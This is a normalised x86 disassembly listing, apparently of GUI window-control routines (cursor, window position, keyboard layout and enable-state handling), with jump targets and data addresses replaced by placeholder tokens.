jne r-xdata
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edi
pop esi
pop ebx
retn
mov esi [ edi + 0x8 ]
test [ esi + 0x18 ] 0x1
jne r-xdata
lea ecx [ esi + 0x14 ]
lea edx [ esi + 0x10 ]
mov eax ebx
call sub_450010
test al al
jne r-xdata
or [ esi + 0x18 ] 0x1
sub_4536a0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4553c4
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax ebx
call sub_451974
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffcf
call sub_403518
sub_4536e8
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax [ esi + 0x4 ]
cmp eax [ ebx + 0x180 ]
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov ax [ esi + 0x8 ]
sub ax 0xfffe
je r-xdata
cmp [ esi + 0xa ] 0x201
jne r-xdata
sub ax 0x3
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov di [ eax + 0x44 ]
test di di
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
push eax
call GetLastActivePopup
mov edi eax
call GetForegroundWindow
cmp edi eax
je r-xdata
test di di
je r-xdata
push esp
call GetCursorPos
push 0x0
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_44e3f8
lea edx [ esp + 0xc ]
xor ecx ecx
mov eax ebx
call sub_4529a0
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46dfec
jmp r-xdata
movsx edx di
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46c4d4
push eax
call SetCursor
mov [ esi + 0xc ] 0x1
jmp r-xdata
test di di
jne r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
je r-xdata
mov di [ eax + 0x78 ]
mov di 0xfffe
jmp r-xdata
mov di [ ebx + 0x78 ]
mov di 0xfffe
jmp r-xdata
sub_453838
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_453917
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45391e
lea eax [ ebp - 0x4 ]
call sub_404118
retn
cmp [ ebx + 0x188 ] 0x0
je r-xdata
mov eax ebx
call sub_4550b4
mov dl [ ebx + 0x184 ]
call sub_459d58
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46c44c
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x188 ]
call sub_408210
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46c24c
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov esi [ eax + 0x3c ]
cmp [ ebx + 0x184 ] 0x0
je r-xdata
push 0x1
push esi
call ActivateKeyboardLayout
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46c24c
mov edx [ ebx + 0x188 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov edi eax
test edi edi
jl r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46c24c
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov esi eax
sub_453924
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_4539ae
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4539b5
lea eax [ ebp - 0x4 ]
call sub_404118
retn
cmp [ ebx + 0x188 ] 0x0
je r-xdata
cmp [ ebx + 0x184 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46c44c
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x188 ]
call sub_408210
test eax eax
je r-xdata
mov eax ebx
call sub_4550b4
mov dl 0x1
call sub_459d3c
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x3c ]
push eax
call ActivateKeyboardLayout
sub_453a10
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dx [ ebp + 0x8 ]
mov eax edi
call sub_41765c
push eax
mov ecx esi
mov edx 0xb038
mov eax ebx
call sub_44fa80
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
cmp [ ebx + 0x1b2 ] 0x0
je r-xdata
push edi
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x1b4 ]
call [ ebx + 0x1b0 ]
sub_453a60
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x1ba ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0xc
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
mov cl [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x1bc ]
call [ ebx + 0x1b8 ]
sub_453a94
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
mov si 0xffd2
call sub_403518
mov eax [ ebp + 0x10 ]
push eax
mov al [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
mov si 0xffc3
call sub_403518
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
sub_453ad4
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
mov [ esp ] 0x1
cmp [ ebx + 0x1f2 ] 0x0
je r-xdata
cmp [ esp ] 0x0
je r-xdata
push esi
lea eax [ esp + 0x4 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x1f4 ]
call [ ebx + 0x1f0 ]
xor eax eax
jmp r-xdata
push edi
mov ecx esi
mov edx 0xb039
mov eax ebx
call sub_44fa80
test eax eax
je r-xdata
mov [ esp ] al
mov al [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_453b2c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_421f84
mov edx [ r-xdata ]
call sub_4034cc
mov [ edi ] eax
pop edi
pop esi
pop ebx
retn
sub_453b64
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x178 ]
test esi esi
je r-xdata
xor eax eax
mov edx edi
mov eax esi
call sub_418cf8
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_453b88
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov edi edx
mov ebx eax
push esi
mov eax ebx
call sub_4550b4
push eax
call GetWindowRect
push 0xa
push 0xa
push esi
call InflateRect
cmp [ ebx + 0x1d2 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
push esi
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x1d4 ]
call [ ebx + 0x1d0 ]
sub_453be4
push ebx
push esi
push edi
mov esi eax
mov eax esi
call sub_453b50
mov edi eax
test edi edi
jle r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov ebx edi
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x178 ]
call sub_418cf8
cmp [ eax + 0x57 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
dec edi
sub_453c24
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x17c ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x17c ]
call sub_405ad0
cmp [ ebx + 0x1a8 ] 0x0
je r-xdata
mov al 0x1
cmp [ esi ] 0x0
jne r-xdata
cmp [ ebx + 0x1a7 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ rw-data ]
call [ eax + 0x24 ]
mov edx eax
test edx edx
je r-xdata
mov [ ebx + 0x1f8 ] al
pop esi
pop ebx
retn
mov eax esi
call sub_405ad0
jmp r-xdata
sub edx 0xffffff8c
cmp [ ebx + 0x1f8 ] 0x0
jne r-xdata
sub_453c90
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_453d38
push [ fs : eax ]
mov [ fs : eax ] esp
cmp bl [ edi + 0x1a8 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_453d3f
lea eax [ ebp - 0x4 ]
call sub_405ab8
retn
mov [ edi + 0x1a8 ] bl
test [ edi + 0x1c ] 0x10
jne r-xdata
mov edx ebx
mov eax edi
call sub_44c560
test bl bl
jne r-xdata
cmp [ edi + 0x178 ] 0x0
jne r-xdata
mov eax [ edi + 0x178 ]
call sub_40331c
xor eax eax
mov [ edi + 0x178 ] eax
lea eax [ edi + 0x17c ]
call sub_405ab8
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax edi
mov si 0xffc6
call sub_403518
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x17c ]
call sub_405ad0
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov [ edi + 0x178 ] eax
sub_453d48
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
lea esi [ eax + 0x44 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x2
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4550b4
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x4 ]
call sub_45194c
xor edx edx
push ebp
push sub_453e0a
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x38 ]
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x4 ]
mov si 0xffcc
call sub_403518
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_453e11
mov eax [ ebp - 0x4 ]
call sub_451954
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ eax + 0x58 ]
push edx
mov edx [ ebp - 0x8 ]
mov cl [ eax + 0x54 ]
mov edx [ ebp - 0x8 ]
mov edx [ eax + 0x38 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x17c ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
sub_453e11
mov eax [ ebp - 0x4 ]
call sub_4657c8
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_44eb14
sub_453e5c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x58 ]
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_403264
cmp esi eax
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_450740
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x57 ]
mov [ ebp - 0x5 ] al
xor eax eax
push ebp
push sub_453ec6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x8 ]
lea ecx [ eax + 0x44 ]
xor edx edx
mov eax [ ebp - 0x4 ]
mov si 0xffcc
call sub_403518
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
retn
mov eax [ ebp - 0x4 ]
call sub_44eb14
sub_453ee0
push ebx
push ecx
mov [ esp ] cl
cmp [ eax + 0x1da ] 0x0
je r-xdata
pop edx
pop ebx
retn
mov cl [ esp ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1dc ]
call [ ebx + 0x1d8 ]
sub_453f08
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_4657c8
mov ebp eax
test ebp ebp
je r-xdata
mov eax [ edi + 0x8 ]
call sub_4656d0
mov [ esp ] al
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
lea edx [ edi + 0x4 ]
mov cl [ esp ]
mov eax esi
mov si 0xffbc
call sub_403518
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_453f08
test al al
jne r-xdata
sub_453f70
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_453f08
test al al
jne r-xdata
mov dx [ esi + 0x4 ]
mov eax ebx
call sub_456220
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_453f9c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_453f08
test al al
jne r-xdata
mov dx [ esi + 0x4 ]
mov eax ebx
call sub_456220
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_453fc8
push ebx
push ecx
mov [ esp ] cl
cmp [ eax + 0x1ea ] 0x0
je r-xdata
pop edx
pop ebx
retn
mov cl [ esp ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1ec ]
call [ ebx + 0x1e8 ]
sub_453ff0
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_4657c8
mov ebp eax
test ebp ebp
je r-xdata
mov eax [ edi + 0x8 ]
call sub_4656d0
mov [ esp ] al
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
lea edx [ edi + 0x4 ]
mov cl [ esp ]
mov eax esi
mov si 0xffbb
call sub_403518
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_453ff0
test al al
jne r-xdata
sub_454058
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_453ff0
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_454078
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_453ff0
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4540b8
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_4657c8
mov ebp eax
test ebp ebp
je r-xdata
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
mov al [ edi + 0x4 ]
mov [ esp ] al
mov edx esp
mov eax esi
mov si 0xffba
call sub_403518
xor eax eax
mov al [ esp ]
mov [ edi + 0x4 ] ax
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_4540b8
test al al
jne r-xdata
sub_45411c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4540b8
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_45413c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_451de4
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_451da8
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
test [ ebx + 0x52 ] 0x1
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x4 ]
mov ecx [ ecx + 0x4 ]
mov edx 0x112
mov eax ebx
call sub_44fa80
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_45413c
pop ecx
test al al
je r-xdata
mov [ ebp - 0x5 ] 0x1
jmp r-xdata
sub_4541ec
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
cmp eax 0xf100
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
cmp eax 0xf100
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x20
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
push ebp
mov eax ebx
call sub_45413c
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x2d
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
jne r-xdata
call GetCapture
test eax eax
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp ebx [ eax + 0x44 ]
je r-xdata
mov eax ebx
call sub_4657c8
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
xor ecx ecx
mov edx 0xb017
mov eax esi
call sub_44fa80
test eax eax
jne r-xdata
sub_454294
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_452d34
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4542b4
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov si [ ebx + 0x4 ]
cmp si 0x1
je r-xdata
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_452d34
test al al
jne r-xdata
cmp si 0x2
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4542e8
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_452d34
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_454308
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
movzx eax [ rw-data ]
push eax
mov eax [ esi + 0x180 ]
push eax
call RemovePropA
movzx eax [ rw-data ]
push eax
mov eax [ esi + 0x180 ]
push eax
call RemovePropA
pop esi
retn
sub_454358
push esi
mov esi eax
test [ esi + 0x1c ] 0x10
je r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov [ edx + 0xc ] 0x1
pop esi
retn
sub_45437c
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] dl
mov ebp eax
mov dl [ esp ]
mov eax ebp
call sub_44db80
mov ebx eax
cmp [ ebp + 0x57 ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_451de4
mov edi eax
dec edi
cmp edi 0x0
jl r-xdata
test [ esp ] bl
jne r-xdata
mov edx edi
mov eax ebp
call sub_451da8
mov dl [ esp ]
mov si 0xffd1
call sub_403518
or bl al
dec edi
cmp edi 0xffffffff
jne r-xdata
sub_4543d4
push ebx
push esi
push edi
mov edi edx
mov ebx eax
or [ ebx + 0x54 ] 0x4
mov dl 0x1
mov eax ebx
mov si 0xffd1
call sub_403518
and eax 0x7f
mov [ edi + 0xc ] eax
pop edi
pop esi
pop ebx
retn
sub_4543f8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor edx edx
mov eax ebx
mov si 0xffd1
call sub_403518
and eax 0x7f
mov [ edi + 0xc ] eax
pop edi
pop esi
pop ebx
retn
sub_454430
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_450554
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov dx 0xb03d
mov eax ebx
call sub_451e44
pop esi
pop ebx
retn
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax ebx
call sub_452654
sub_454468
push ebx
push esi
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov eax ebx
mov si 0xffc2
call sub_403518
pop esi
pop ebx
retn
mov eax ebx
call sub_44ef10
test al al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x3c ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x3c ]
call sub_4045d8
push eax
call LoadKeyboardLayoutA
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x38 ]
call sub_4045d8
push eax
call LoadKeyboardLayoutA
jmp r-xdata
sub_4544e8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_452a34
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_450628
sub_454548
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax ebx
call sub_4527a8
test [ ebx + 0x51 ] 0x4
je r-xdata
xor edx edx
mov eax ebx
call sub_451ba4
pop ebx
retn
sub_454578
xor edx edx
mov dl [ eax + 0x1a6 ]
movzx edx [ edx * 2 + rw-data ]
push edx
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ eax + 0x180 ]
push eax
call SetWindowPos
retn
sub_4545a0
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax ebx
call sub_4553b8
test al al
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor edx edx
mov eax ebx
call sub_451ba4
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
neg al
sbb eax eax
push eax
mov eax [ ebx + 0x180 ]
push eax
call EnableWindow
sub_454610
push ebx
mov ebx eax
mov eax ebx
call sub_450494
mov eax ebx
call sub_4553b8
test al al
je r-xdata
mov dx 0xb008
mov eax ebx
call sub_451e44
pop ebx
retn
push 0x0
mov eax [ ebx + 0x68 ]
call sub_424b14
mov ecx eax
mov edx 0x30
mov eax ebx
call sub_44fa80
sub_45464c
push ebx
add esp 0xfffffff8
mov ebx eax
call GetCapture
test eax eax
jne r-xdata
pop ecx
pop edx
pop ebx
retn
push esp
call GetCursorPos
mov eax esp
xor edx edx
call sub_44d160
cmp ebx eax
jne r-xdata
push 0x1
mov eax ebx
call sub_4550b4
mov ecx eax
mov edx 0x20
mov eax ebx
call sub_44fa80
sub_45468c
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_4553b8
test al al
je r-xdata
pop esi
retn
push 0x37
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_4550b4
push eax
call SetWindowPos
cmp [ esi + 0x57 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_4546cc
push ebx
mov ebx eax
test [ ebx + 0x50 ] 0x10
je r-xdata
mov dx 0xb011
mov eax ebx
call sub_451e44
pop ebx
retn
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax ebx
call sub_4553b8
test al al
je r-xdata
mov eax [ ebx + 0x180 ]
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov eax ebx
call sub_454fbc
sub_45470c
push ebx
mov ebx eax
cmp [ ebx + 0x1a9 ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov dl [ eax + 0x1a5 ]
mov eax ebx
call sub_4551f4
cmp [ edx + 0x8 ] 0x0
setne al
mov edx eax
mov eax ebx
call sub_4551f4
jmp r-xdata
mov [ ebx + 0x1a9 ] 0x1
sub_45476c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov edi [ ebx + 0x8 ]
mov al [ ebx + 0x4 ]
sub al 0x4
jb r-xdata
cmp [ edi + 0xc ] 0x0
je r-xdata
dec al
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ edi + 0xc ]
call sub_44f4dc
jmp r-xdata
push 0x0
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
call sub_44e3f8
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax esi
call sub_4529a0
mov ebp eax
mov [ ebx + 0xc ] ebp
test ebp ebp
jne r-xdata
jmp r-xdata
mov [ ebx + 0xc ] esi
sub_4547dc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4505cc
mov edx esi
mov eax ebx
call sub_451e04
pop esi
pop ebx
retn
sub_4547f8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebp edx
mov [ esp ] eax
mov [ esp + 0x4 ] 0x1
mov eax [ esp ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov ecx [ ebp + 0x8 ]
movzx edx [ ebp + 0x4 ]
mov eax 0xb016
call sub_44b7f0
test eax eax
jne r-xdata
mov ebx [ esp ]
test ebx ebx
je r-xdata
mov al [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x4 ] 0x0
mov eax [ esp ]
call sub_4657c8
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
mov si 0xffd6
call sub_403518
mov edi eax
test edi edi
je r-xdata
mov edx ebp
mov eax ebx
mov si 0xffab
call sub_403518
test al al
jne r-xdata
mov ebx [ ebx + 0x30 ]
test ebx ebx
jne r-xdata
cmp [ edi + 0x38 ] 0x0
je r-xdata
mov edx ebp
mov eax edi
mov si 0xffef
call sub_403518
test al al
jne r-xdata
sub_45488c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov [ esi + 0xc ] 0x1
mov dx [ esi + 0x4 ]
mov eax ebx
call sub_456220
mov edx esi
mov eax ebx
call sub_4547f8
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
push ebx
movzx ecx [ esi + 0x4 ]
mov edx 0xb02e
mov eax ebx
call sub_44fa80
test eax eax
jne r-xdata
xor edi edi
movzx eax [ esi + 0x4 ]
cmp eax 0x1b
jg r-xdata
add eax 0xffffffdb
sub eax 0x4
jb r-xdata
je r-xdata
mov edi 0x1
jmp r-xdata
sub eax 0x2
je r-xdata
mov edi 0x4
sub eax 0x3
je r-xdata
test edi edi
je r-xdata
jmp r-xdata
push 0x0
movzx ecx [ esi + 0x4 ]
mov edx 0xb01e
mov eax ebx
call sub_44fa80
test eax eax
jne r-xdata
